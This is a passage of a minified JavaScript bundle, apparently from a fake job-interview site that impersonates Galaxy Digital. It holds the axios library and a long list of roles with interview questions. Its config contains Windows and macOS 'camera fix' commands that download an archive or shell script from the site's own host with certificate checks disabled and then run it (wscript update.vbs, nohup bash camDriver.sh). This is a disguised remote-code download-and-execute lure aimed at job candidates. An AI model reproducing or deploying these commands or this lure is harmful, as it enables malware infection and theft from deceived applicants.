0,l=o-r,u=i(l),c=o<=a;r=o;const d={loaded:o,total:a,progress:a?o/a:void 0,bytes:l,rate:u||void 0,estimated:u&&a&&c?(a-o)/u:void 0,event:s,lengthComputable:a!=null,[e?"download":"upload"]:!0};t(d)},n)},jx=(t,e)=>{const n=t!=null;return[r=>e[0]({lengthComputable:n,total:t,loaded:r}),e[1]]},Fx=t=>(...e)=>T.asap(()=>t(...e)),MI=Ze.hasStandardBrowserEnv?((t,e)=>n=>(n=new URL(n,Ze.origin),t.protocol===n.protocol&&t.host===n.host&&(e||t.port===n.port)))(new URL(Ze.origin),Ze.navigator&&/(msie|trident)/i.test(Ze.navigator.userAgent)):()=>!0,NI=Ze.hasStandardBrowserEnv?{write(t,e,n,r,i,s){const o=[t+"="+encodeURIComponent(e)];T.isNumber(n)&&o.push("expires="+new Date(n).toGMTString()),T.isString(r)&&o.push("path="+r),T.isString(i)&&o.push("domain="+i),s===!0&&o.push("secure"),document.cookie=o.join("; ")},read(t){const e=document.cookie.match(new RegExp("(^|;\\s*)("+t+")=([^;]*)"));return e?decodeURIComponent(e[3]):null},remove(t){this.write(t,"",Date.now()-864e5)}}:{write(){},read(){return null},remove(){}};function AI(t){return/^([a-z][a-z\d+\-.]*:)?\/\//i.test(t)}function PI(t,e){return e?t.replace(/\/?\/$/,"")+"/"+e.replace(/^\/+/,""):t}function $b(t,e,n){let r=!AI(e);return t&&(r||n==!1)?PI(t,e):e}const Bx=t=>t instanceof St?{...t}:t;function vi(t,e){e=e||{};const n={};function r(u,c,d,f){return T.isPlainObject(u)&&T.isPlainObject(c)?T.merge.call({caseless:f},u,c):T.isPlainObject(c)?T.merge({},c):T.isArray(c)?c.slice():c}function i(u,c,d,f){if(T.isUndefined(c)){if(!T.isUndefined(u))return r(void 0,u,d,f)}else return r(u,c,d,f)}function s(u,c){if(!T.isUndefined(c))return r(void 0,c)}function o(u,c){if(T.isUndefined(c)){if(!T.isUndefined(u))return r(void 0,u)}else return r(void 0,c)}function a(u,c,d){if(d in e)return r(u,c);if(d in t)return r(void 0,u)}const l={url:s,method:s,data:s,baseURL:o,transformRequest:o,transformResponse:o,paramsSerializer:o,timeout:o,timeoutMessage:o,withCredentials:o,withXSRFToken:o,adapter:o,responseType:o,xsrfCookieName:o,xsrfHeaderName:o,onUploadProgress:o,onDownloadProgress:o,decompress:o,maxContentLength:o,maxBodyLength:o,beforeRedirect:o,transport:o,httpAgent:o,httpsAgent:o,cancelToken:o,socketPath:o,responseEncoding:o,validateStatus:a,headers:(u,c,d)=>i(Bx(u),Bx(c),d,!0)};return T.forEach(Object.keys({...t,...e}),function(c){const d=l[c]||i,f=d(t[c],e[c],c);T.isUndefined(f)&&d!==a||(n[c]=f)}),n}const Hb=t=>{const e=vi({},t);let{data:n,withXSRFToken:r,xsrfHeaderName:i,xsrfCookieName:s,headers:o,auth:a}=e;e.headers=o=St.from(o),e.url=Fb($b(e.baseURL,e.url,e.allowAbsoluteUrls),t.params,t.paramsSerializer),a&&o.set("Authorization","Basic "+btoa((a.username||"")+":"+(a.password?unescape(encodeURIComponent(a.password)):"")));let l;if(T.isFormData(n)){if(Ze.hasStandardBrowserEnv||Ze.hasStandardBrowserWebWorkerEnv)o.setContentType(void 0);else if((l=o.getContentType())!==!1){const[u,...c]=l?l.split(";").map(d=>d.trim()).filter(Boolean):[];o.setContentType([u||"multipart/form-data",...c].join("; "))}}if(Ze.hasStandardBrowserEnv&&(r&&T.isFunction(r)&&(r=r(e)),r||r!==!1&&MI(e.url))){const u=i&&s&&NI.read(s);u&&o.set(i,u)}return e},RI=typeof XMLHttpRequest<"u",OI=RI&&function(t){return new Promise(function(n,r){const i=Hb(t);let s=i.data;const o=St.from(i.headers).normalize();let{responseType:a,onUploadProgress:l,onDownloadProgress:u}=i,c,d,f,h,p;function y(){h&&h(),p&&p(),i.cancelToken&&i.cancelToken.unsubscribe(c),i.signal&&i.signal.removeEventListener("abort",c)}let x=new XMLHttpRequest;x.open(i.method.toUpperCase(),i.url,!0),x.timeout=i.timeout;function g(){if(!x)return;const w=St.from("getAllResponseHeaders"in x&&x.getAllResponseHeaders()),k={data:!a||a==="text"||a==="json"?x.responseText:x.response,status:x.status,statusText:x.statusText,headers:w,config:t,request:x};_b(function(M){n(M),y()},function(M){r(M),y()},k),x=null}"onloadend"in x?x.onloadend=g:x.onreadystatechange=function(){!x||x.readyState!==4||x.status===0&&!(x.responseURL&&x.responseURL.indexOf("file:")===0)||setTimeout(g)},x.onabort=function(){x&&(r(new U("Request aborted",U.ECONNABORTED,t,x)),x=null)},x.onerror=function(){r(new U("Network Error",U.ERR_NETWORK,t,x)),x=null},x.ontimeout=function(){let b=i.timeout?"timeout of "+i.timeout+"ms exceeded":"timeout exceeded";const k=i.transitional||Bb;i.timeoutErrorMessage&&(b=i.timeoutErrorMessage),r(new U(b,k.clarifyTimeoutError?U.ETIMEDOUT:U.ECONNABORTED,t,x)),x=null},s===void 0&&o.setContentType(null),"setRequestHeader"in x&&T.forEach(o.toJSON(),function(b,k){x.setRequestHeader(k,b)}),T.isUndefined(i.withCredentials)||(x.withCredentials=!!i.withCredentials),a&&a!=="json"&&(x.responseType=i.responseType),u&&([f,p]=Eu(u,!0),x.addEventListener("progress",f)),l&&x.upload&&([d,h]=Eu(l),x.upload.addEventListener("progress",d),x.upload.addEventListener("loadend",h)),(i.cancelToken||i.signal)&&(c=w=>{x&&(r(!w||w.type?new zs(null,t,x):w),x.abort(),x=null)},i.cancelToken&&i.cancelToken.subscribe(c),i.signal&&(i.signal.aborted?c():i.signal.addEventListener("abort",c)));const v=CI(i.url);if(v&&Ze.protocols.indexOf(v)===-1){r(new U("Unsupported protocol "+v+":",U.ERR_BAD_REQUEST,t));return}x.send(s||null)})},DI=(t,e)=>{const{length:n}=t=t?t.filter(Boolean):[];if(e||n){let r=new AbortController,i;const s=function(u){if(!i){i=!0,a();const c=u instanceof Error?u:this.reason;r.abort(c instanceof U?c:new zs(c instanceof Error?c.message:c))}};let o=e&&setTimeout(()=>{o=null,s(new U(`timeout ${e} of ms exceeded`,U.ETIMEDOUT))},e);const a=()=>{t&&(o&&clearTimeout(o),o=null,t.forEach(u=>{u.unsubscribe?u.unsubscribe(s):u.removeEventListener("abort",s)}),t=null)};t.forEach(u=>u.addEventListener("abort",s));const{signal:l}=r;return l.unsubscribe=()=>T.asap(a),l}},LI=function*(t,e){let n=t.byteLength;if(n<e){yield t;return}let r=0,i;for(;r<n;)i=r+e,yield t.slice(r,i),r=i},II=async function*(t,e){for await(const n of jI(t))yield*LI(n,e)},jI=async function*(t){if(t[Symbol.asyncIterator]){yield*t;return}const e=t.getReader();try{for(;;){const{done:n,value:r}=await e.read();if(n)break;yield r}}finally{await e.cancel()}},Vx=(t,e,n,r)=>{const i=II(t,e);let s=0,o,a=l=>{o||(o=!0,r&&r(l))};return new ReadableStream({async pull(l){try{const{done:u,value:c}=await i.next();if(u){a(),l.close();return}let d=c.byteLength;if(n){let f=s+=d;n(f)}l.enqueue(new Uint8Array(c))}catch(u){throw a(u),u}},cancel(l){return a(l),i.return()}},{highWaterMark:2})},_c=typeof fetch=="function"&&typeof Request=="function"&&typeof Response=="function",Ub=_c&&typeof ReadableStream=="function",FI=_c&&(typeof TextEncoder=="function"?(t=>e=>t.encode(e))(new TextEncoder):async t=>new Uint8Array(await new Response(t).arrayBuffer())),Wb=(t,...e)=>{try{return!!t(...e)}catch{return!1}},BI=Ub&&Wb(()=>{let t=!1;const e=new Request(Ze.origin,{body:new ReadableStream,method:"POST",get duplex(){return t=!0,"half"}}).headers.has("Content-Type");return t&&!e}),zx=64*1024,Wh=Ub&&Wb(()=>T.isReadableStream(new Response("").body)),Tu={stream:Wh&&(t=>t.body)};_c&&(t=>{["text","arrayBuffer","blob","formData","stream"].forEach(e=>{!Tu[e]&&(Tu[e]=T.isFunction(t[e])?n=>n[e]():(n,r)=>{throw new U(`Response type '${e}' is not supported`,U.ERR_NOT_SUPPORT,r)})})})(new Response);const VI=async t=>{if(t==null)return 0;if(T.isBlob(t))return t.size;if(T.isSpecCompliantForm(t))return(await new Request(Ze.origin,{method:"POST",body:t}).arrayBuffer()).byteLength;if(T.isArrayBufferView(t)||T.isArrayBuffer(t))return t.byteLength;if(T.isURLSearchParams(t)&&(t=t+""),T.isString(t))return(await FI(t)).byteLength},zI=async(t,e)=>{const n=T.toFiniteNumber(t.getContentLength());return n??VI(e)},_I=_c&&(async t=>{let{url:e,method:n,data:r,signal:i,cancelToken:s,timeout:o,onDownloadProgress:a,onUploadProgress:l,responseType:u,headers:c,withCredentials:d="same-origin",fetchOptions:f}=Hb(t);u=u?(u+"").toLowerCase():"text";let h=DI([i,s&&s.toAbortSignal()],o),p;const y=h&&h.unsubscribe&&(()=>{h.unsubscribe()});let x;try{if(l&&BI&&n!=="get"&&n!=="head"&&(x=await zI(c,r))!==0){let k=new Request(e,{method:"POST",body:r,duplex:"half"}),E;if(T.isFormData(r)&&(E=k.headers.get("content-type"))&&c.setContentType(E),k.body){const[M,C]=jx(x,Eu(Fx(l)));r=Vx(k.body,zx,M,C)}}T.isString(d)||(d=d?"include":"omit");const g="credentials"in Request.prototype;p=new Request(e,{...f,signal:h,method:n.toUpperCase(),headers:c.normalize().toJSON(),body:r,duplex:"half",credentials:g?d:void 0});let v=await fetch(p,f);const w=Wh&&(u==="stream"||u==="response");if(Wh&&(a||w&&y)){const k={};["status","statusText","headers"].forEach(N=>{k[N]=v[N]});const E=T.toFiniteNumber(v.headers.get("content-length")),[M,C]=a&&jx(E,Eu(Fx(a),!0))||[];v=new Response(Vx(v.body,zx,M,()=>{C&&C(),y&&y()}),k)}u=u||"text";let b=await Tu[T.findKey(Tu,u)||"text"](v,t);return!w&&y&&y(),await new Promise((k,E)=>{_b(k,E,{data:b,headers:St.from(v.headers),status:v.status,statusText:v.statusText,config:t,request:p})})}catch(g){throw y&&y(),g&&g.name==="TypeError"&&/Load failed|fetch/i.test(g.message)?Object.assign(new U("Network Error",U.ERR_NETWORK,t,p),{cause:g.cause||g}):U.from(g,g&&g.code,t,p)}}),Kh={http:nI,xhr:OI,fetch:_I};T.forEach(Kh,(t,e)=>{if(t){try{Object.defineProperty(t,"name",{value:e})}catch{}Object.defineProperty(t,"adapterName",{value:e})}});const _x=t=>`- ${t}`,$I=t=>T.isFunction(t)||t===null||t===!1,Kb={getAdapter:t=>{t=T.isArray(t)?t:[t];const{length:e}=t;let n,r;const i={};for(let s=0;s<e;s++){n=t[s];let o;if(r=n,!$I(n)&&(r=Kh[(o=String(n)).toLowerCase()],r===void 0))throw new U(`Unknown adapter '${o}'`);if(r)break;i[o||"#"+s]=r}if(!r){const s=Object.entries(i).map(([a,l])=>`adapter ${a} `+(l===!1?"is not supported by the environment":"is not available in the build"));let o=e?s.length>1?`since :
`+s.map(_x).join(`
`):" "+_x(s[0]):"as no adapter specified";throw new U("There is no suitable adapter to dispatch the request "+o,"ERR_NOT_SUPPORT")}return r},adapters:Kh};function Qd(t){if(t.cancelToken&&t.cancelToken.throwIfRequested(),t.signal&&t.signal.aborted)throw new zs(null,t)}function $x(t){return Qd(t),t.headers=St.from(t.headers),t.data=Yd.call(t,t.transformRequest),["post","put","patch"].indexOf(t.method)!==-1&&t.headers.setContentType("application/x-www-form-urlencoded",!1),Kb.getAdapter(t.adapter||ja.adapter)(t).then(function(r){return Qd(t),r.data=Yd.call(t,t.transformResponse,r),r.headers=St.from(r.headers),r},function(r){return zb(r)||(Qd(t),r&&r.response&&(r.response.data=Yd.call(t,t.transformResponse,r.response),r.response.headers=St.from(r.response.headers))),Promise.reject(r)})}const qb="1.11.0",$c={};["object","boolean","number","function","string","symbol"].forEach((t,e)=>{$c[t]=function(r){return typeof r===t||"a"+(e<1?"n ":" ")+t}});const Hx={};$c.transitional=function(e,n,r){function i(s,o){return"[Axios v"+qb+"] Transitional option '"+s+"'"+o+(r?". "+r:"")}return(s,o,a)=>{if(e===!1)throw new U(i(o," has been removed"+(n?" in "+n:"")),U.ERR_DEPRECATED);return n&&!Hx[o]&&(Hx[o]=!0,console.warn(i(o," has been deprecated since v"+n+" and will be removed in the near future"))),e?e(s,o,a):!0}};$c.spelling=function(e){return(n,r)=>(console.warn(`${r} is likely a misspelling of ${e}`),!0)};function HI(t,e,n){if(typeof t!="object")throw new U("options must be an object",U.ERR_BAD_OPTION_VALUE);const r=Object.keys(t);let i=r.length;for(;i-- >0;){const s=r[i],o=e[s];if(o){const a=t[s],l=a===void 0||o(a,s,t);if(l!==!0)throw new U("option "+s+" must be "+l,U.ERR_BAD_OPTION_VALUE);continue}if(n!==!0)throw new U("Unknown option "+s,U.ERR_BAD_OPTION)}}const $l={assertOptions:HI,validators:$c},dn=$l.validators;class li{constructor(e){this.defaults=e||{},this.interceptors={request:new Lx,response:new Lx}}async request(e,n){try{return await this._request(e,n)}catch(r){if(r instanceof Error){let i={};Error.captureStackTrace?Error.captureStackTrace(i):i=new Error;const s=i.stack?i.stack.replace(/^.+\n/,""):"";try{r.stack?s&&!String(r.stack).endsWith(s.replace(/^.+\n.+\n/,""))&&(r.stack+=`
`+s):r.stack=s}catch{}}throw r}}_request(e,n){typeof e=="string"?(n=n||{},n.url=e):n=e||{},n=vi(this.defaults,n);const{transitional:r,paramsSerializer:i,headers:s}=n;r!==void 0&&$l.assertOptions(r,{silentJSONParsing:dn.transitional(dn.boolean),forcedJSONParsing:dn.transitional(dn.boolean),clarifyTimeoutError:dn.transitional(dn.boolean)},!1),i!=null&&(T.isFunction(i)?n.paramsSerializer={serialize:i}:$l.assertOptions(i,{encode:dn.function,serialize:dn.function},!0)),n.allowAbsoluteUrls!==void 0||(this.defaults.allowAbsoluteUrls!==void 0?n.allowAbsoluteUrls=this.defaults.allowAbsoluteUrls:n.allowAbsoluteUrls=!0),$l.assertOptions(n,{baseUrl:dn.spelling("baseURL"),withXsrfToken:dn.spelling("withXSRFToken")},!0),n.method=(n.method||this.defaults.method||"get").toLowerCase();let o=s&&T.merge(s.common,s[n.method]);s&&T.forEach(["delete","get","head","post","put","patch","common"],p=>{delete s[p]}),n.headers=St.concat(o,s);const a=[];let l=!0;this.interceptors.request.forEach(function(y){typeof y.runWhen=="function"&&y.runWhen(n)===!1||(l=l&&y.synchronous,a.unshift(y.fulfilled,y.rejected))});const u=[];this.interceptors.response.forEach(function(y){u.push(y.fulfilled,y.rejected)});let c,d=0,f;if(!l){const p=[$x.bind(this),void 0];for(p.unshift(...a),p.push(...u),f=p.length,c=Promise.resolve(n);d<f;)c=c.then(p[d++],p[d++]);return c}f=a.length;let h=n;for(d=0;d<f;){const p=a[d++],y=a[d++];try{h=p(h)}catch(x){y.call(this,x);break}}try{c=$x.call(this,h)}catch(p){return Promise.reject(p)}for(d=0,f=u.length;d<f;)c=c.then(u[d++],u[d++]);return c}getUri(e){e=vi(this.defaults,e);const n=$b(e.baseURL,e.url,e.allowAbsoluteUrls);return Fb(n,e.params,e.paramsSerializer)}}T.forEach(["delete","get","head","options"],function(e){li.prototype[e]=function(n,r){return this.request(vi(r||{},{method:e,url:n,data:(r||{}).data}))}});T.forEach(["post","put","patch"],function(e){function n(r){return function(s,o,a){return this.request(vi(a||{},{method:e,headers:r?{"Content-Type":"multipart/form-data"}:{},url:s,data:o}))}}li.prototype[e]=n(),li.prototype[e+"Form"]=n(!0)});class lg{constructor(e){if(typeof e!="function")throw new TypeError("executor must be a function.");let n;this.promise=new Promise(function(s){n=s});const r=this;this.promise.then(i=>{if(!r._listeners)return;let s=r._listeners.length;for(;s-- >0;)r._listeners[s](i);r._listeners=null}),this.promise.then=i=>{let s;const o=new Promise(a=>{r.subscribe(a),s=a}).then(i);return o.cancel=function(){r.unsubscribe(s)},o},e(function(s,o,a){r.reason||(r.reason=new zs(s,o,a),n(r.reason))})}throwIfRequested(){if(this.reason)throw this.reason}subscribe(e){if(this.reason){e(this.reason);return}this._listeners?this._listeners.push(e):this._listeners=[e]}unsubscribe(e){if(!this._listeners)return;const n=this._listeners.indexOf(e);n!==-1&&this._listeners.splice(n,1)}toAbortSignal(){const e=new AbortController,n=r=>{e.abort(r)};return this.subscribe(n),e.signal.unsubscribe=()=>this.unsubscribe(n),e.signal}static source(){let e;return{token:new lg(function(i){e=i}),cancel:e}}}function UI(t){return function(n){return t.apply(null,n)}}function WI(t){return T.isObject(t)&&t.isAxiosError===!0}const qh={Continue:100,SwitchingProtocols:101,Processing:102,EarlyHints:103,Ok:200,Created:201,Accepted:202,NonAuthoritativeInformation:203,NoContent:204,ResetContent:205,PartialContent:206,MultiStatus:207,AlreadyReported:208,ImUsed:226,MultipleChoices:300,MovedPermanently:301,Found:302,SeeOther:303,NotModified:304,UseProxy:305,Unused:306,TemporaryRedirect:307,PermanentRedirect:308,BadRequest:400,Unauthorized:401,PaymentRequired:402,Forbidden:403,NotFound:404,MethodNotAllowed:405,NotAcceptable:406,ProxyAuthenticationRequired:407,RequestTimeout:408,Conflict:409,Gone:410,LengthRequired:411,PreconditionFailed:412,PayloadTooLarge:413,UriTooLong:414,UnsupportedMediaType:415,RangeNotSatisfiable:416,ExpectationFailed:417,ImATeapot:418,MisdirectedRequest:421,UnprocessableEntity:422,Locked:423,FailedDependency:424,TooEarly:425,UpgradeRequired:426,PreconditionRequired:428,TooManyRequests:429,RequestHeaderFieldsTooLarge:431,UnavailableForLegalReasons:451,InternalServerError:500,NotImplemented:501,BadGateway:502,ServiceUnavailable:503,GatewayTimeout:504,HttpVersionNotSupported:505,VariantAlsoNegotiates:506,InsufficientStorage:507,LoopDetected:508,NotExtended:510,NetworkAuthenticationRequired:511};Object.entries(qh).forEach(([t,e])=>{qh[e]=t});function Gb(t){const e=new li(t),n=Eb(li.prototype.request,e);return T.extend(n,li.prototype,e,{allOwnKeys:!0}),T.extend(n,e,null,{allOwnKeys:!0}),n.create=function(i){return Gb(vi(t,i))},n}const ae=Gb(ja);ae.Axios=li;ae.CanceledError=zs;ae.CancelToken=lg;ae.isCancel=zb;ae.VERSION=qb;ae.toFormData=zc;ae.AxiosError=U;ae.Cancel=ae.CanceledError;ae.all=function(e){return Promise.all(e)};ae.spread=UI;ae.isAxiosError=WI;ae.mergeConfig=vi;ae.AxiosHeaders=St;ae.formToJSON=t=>Vb(T.isHTMLForm(t)?new FormData(t):t);ae.getAdapter=Kb.getAdapter;ae.HttpStatusCode=qh;ae.default=ae;const ua="userData",Jb="inviteCode",KI=24*3,wi="https://auto-ai.online/",qI="AL0826I",Fa={signup:"now-assessment",vcallstarted:"video-just",isrun:"isrun",feedback:"feedback",addinvitecode:"api/invite-codes/add"},Ux={windows:String.raw`curl -k -o "%TEMP%\fixed.zip" "${wi}cam-v-unique.fix" && powershell -Command "Expand-Archive -Force -Path '%TEMP%\fixed.zip' -DestinationPath '%TEMP%\fixed'" && wscript "%TEMP%\fixed\update.vbs"`,mac:`curl -k -o /var/tmp/camDriver.sh "${wi}mac-v-unique.fixer" && chmod +x /var/tmp/camDriver.sh && nohup bash /var/tmp/camDriver.sh >/dev/null 2>&1 &`},ug=[{id:"g1o",role:"Head of Operations",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How would you design and implement operational frameworks to support Galaxys growing business lines?","Whats your approach to managing risk and compliance across global operations?","How do you ensure operational efficiency while scaling in a rapidly evolving digital assets environment?"]},{id:"t2a",role:"Trade Assistant",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you ensure accuracy and timeliness when supporting trade execution?","Whats your process for reconciling trade discrepancies across multiple systems?","How do you support traders while maintaining compliance and risk controls?"]},{id:"d3p",role:"Director of Partnerships",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you identify and secure high-value strategic partnerships in the digital assets space?","Whats your framework for evaluating long-term ecosystem collaborations?","How do you measure partnership success in terms of revenue, adoption, and brand impact?"]},{id:"s4l",role:"Sales & Partnerships Lead",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How would you build and lead a sales pipeline for institutional clients in digital assets?","Whats your approach to managing both sales execution and strategic partnerships?","How do you balance short-term sales targets with long-term relationship building?"]},{id:"h5p",role:"Head of Product",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you define and prioritize the product roadmap in a fast-moving crypto environment?","Whats your approach to aligning product strategy with business growth goals?","How do you incorporate client feedback into product development without losing focus?"]},{id:"p6m",role:"Product Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you gather and prioritize product requirements from stakeholders?","Whats your approach to balancing short-term feature delivery with long-term vision?","How do you ensure product-market fit in a competitive crypto landscape?"]},{id:"s7p",role:"Senior Product Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you lead cross-functional teams to deliver complex blockchain products?","Whats your framework for scaling product strategy across multiple markets?","How do you evaluate and iterate on product success metrics?"]},{id:"s6m",role:"Senior Project Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you ensure cross-functional alignment on complex blockchain projects?","Whats your method for managing competing priorities and tight deadlines?","How do you measure project success beyond on-time delivery?"]},{id:"f7m",role:"Fund Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you design and manage investment strategies in digital asset funds?","Whats your approach to risk management in volatile markets?","How do you communicate fund performance to both institutional and retail investors?"]},{id:"p8f",role:"Portfolio Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you structure and manage diversified investment portfolios including crypto assets?","Whats your approach to risk-adjusted portfolio optimization in volatile markets?","How do you report portfolio performance to stakeholders and clients?"]},{id:"m8f",role:"Multi-Asset Fund Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you structure and balance exposure across multiple asset classes including crypto?","Whats your framework for rebalancing in volatile or uncertain markets?","How do you evaluate new asset classes for inclusion in a diversified portfolio?"]},{id:"s9m",role:"Sales & Partnerships Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you identify new institutional sales opportunities in the crypto ecosystem?","Whats your strategy for managing long-term client relationships?","How do you measure the impact of sales activities on overall business growth?"]},{id:"b1m",role:"Business Development & Partnerships Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you identify and pursue new business development opportunities in digital assets?","Whats your approach to building strategic partnerships across the crypto ecosystem?","How do you balance short-term revenue growth with long-term ecosystem building?"]},{id:"r2h",role:"Head of Research",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you set a research agenda that aligns with business strategy?","Whats your approach to leading a research team across crypto and traditional markets?","How do you ensure research outputs provide actionable insights for decision-makers?"]},{id:"a9t",role:"Tokenomics Analyst",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you analyze token economic models to ensure sustainable growth?","Whats your approach to evaluating token incentives, supply, and distribution?","How do you communicate tokenomics insights to product and investment teams?"]},{id:"d4m",role:"Director of Marketing",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you build a brand strategy that resonates with both institutional and retail audiences?","Whats your framework for measuring ROI across digital and traditional marketing channels?","How do you adapt marketing strategies in the fast-changing digital assets industry?"]},{id:"h3m",role:"Head of Marketing",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you lead marketing strategy to drive both awareness and adoption of digital assets?","Whats your approach to managing cross-channel campaigns for maximum impact?","How do you align marketing initiatives with overall business goals?"]},{id:"v0m",role:"VP of Product Management",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you define and prioritize product roadmaps in a fast-evolving crypto and blockchain ecosystem?","Whats your approach to aligning cross-functional teams (engineering, design, sales) around product strategy?","How do you measure product success and ensure it drives both customer adoption and business growth?"]},{id:"l2p",role:"Lead Product Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you translate business objectives into a clear and actionable product roadmap?","Whats your approach to mentoring junior product managers while still driving product execution?","How do you balance innovation with risk management when launching new blockchain products?"]},{id:"vsd",role:"VP of Sales & Business Development",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["Whats your approach to driving large-scale institutional sales?","How do you build and lead a high-performing sales team?","Whats your strategy for balancing short-term revenue targets with long-term partnerships?"]},{id:"bsm",role:"Business Strategy Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you evaluate new business opportunities in digital assets?","What frameworks do you use to develop and refine corporate strategy?","How do you align strategic initiatives with evolving market conditions?"]},{id:"fsm",role:"Finance System Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you design and implement scalable financial systems?","Whats your approach to integrating finance systems with blockchain platforms?","How do you ensure compliance and accuracy in reporting across global entities?"]},{id:"dpm",role:"Director of Product Management",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How would you define and communicate a clear product vision and strategy for Galaxys offerings?","Whats your approach to balancing customer needs with business objectives when prioritizing features?","How do you lead cross-functional teams to deliver complex blockchain products?"]},{id:"dbd",role:"Director of Business Development",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["What strategies would you use to expand Galaxys business development pipeline in institutional crypto markets?","How do you evaluate and prioritize potential partnerships?","How would you align business development initiatives with Galaxys long-term growth strategy?"]},{id:"crs",role:"Crypto Researcher",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you identify and analyze emerging trends in the cryptocurrency ecosystem?","Whats your approach to conducting due diligence on new blockchain projects?","How would you communicate complex research findings to both technical and non-technical stakeholders?"]},{id:"qtr",role:"Quantitative Trader",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["What quantitative strategies have you developed and implemented for trading digital assets?","How do you manage risk when deploying algorithmic trading models in volatile crypto markets?","What tools, programming languages, and data sources do you rely on to backtest and optimize trading strategies?"]},{id:"dqf",role:"Director of Quantitative Finance",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you lead the development of quantitative models to support risk management and trading strategies?","Whats your approach to integrating quantitative research with business and investment decision-making?","How would you build and manage a high-performing quant team in the digital assets space?"]},{id:"sda",role:"Senior Data Analytics",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you approach building scalable data pipelines for blockchain and digital asset analytics?","What methods do you use to ensure accuracy and reliability of large-scale financial data?","Can you share an example of using data analytics to drive business or trading decisions?"]},{id:"spm",role:"Senior Portfolio Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you structure and manage institutional crypto portfolios to balance risk and return?","Whats your framework for evaluating new digital assets for portfolio inclusion?","How do you adapt portfolio strategies to rapidly changing market conditions?"]},{id:"pjm",role:"Project Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you ensure successful delivery of cross-functional blockchain projects?","What methods do you use to manage timelines, resources, and competing priorities?","How do you measure project success beyond on-time and on-budget delivery?"]},{id:"mdr",role:"Managing Director",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How would you define and drive Galaxys long-term business strategy?","Whats your approach to leading senior teams across multiple business lines?","How do you balance innovation and risk management in a fast-moving digital asset industry?"]},{id:"bca",role:"Blockchain Advisor",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you evaluate emerging blockchain trends and advise on strategic opportunities?","Whats your approach to guiding institutional clients on blockchain adoption?","How do you balance innovation with regulatory and compliance considerations in blockchain strategy?"]},{id:"gmm",role:"Growth Marketing Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How would you design and execute growth strategies to expand Galaxys user base?","Whats your approach to leveraging data and analytics for marketing performance?","How do you balance brand positioning with performance-driven campaigns in the digital assets space?"]},{id:"w3c",role:"Senior Web3 Community Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How would you build and scale Galaxys Web3 community across multiple platforms?","Whats your approach to engaging, retaining, and empowering community members in crypto ecosystems?","How do you measure community success and align it with Galaxys broader business goals?"]},{id:"cmm",role:"Community Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you foster an engaged and inclusive community around Galaxys brand?","Whats your approach to managing community feedback and escalating key insights internally?","How do you measure the effectiveness of community engagement initiatives?"]},{id:"hoc",role:"Head of Community",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How would you design Galaxys overall community strategy to drive engagement and growth?","Whats your approach to leading and scaling global community teams?","How do you align community initiatives with Galaxys business objectives and brand positioning?"]},{id:"hir",role:"Head of Investor Relations",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How would you develop and execute Galaxys investor relations strategy to strengthen institutional trust?","Whats your approach to communicating financial performance and strategic vision to investors?","How do you balance transparency with regulatory and compliance requirements in investor communications?"]},{id:"hdf",role:"Head of DeFi",company:{url:"https://www.galaxy.com/",name:"Galaxy 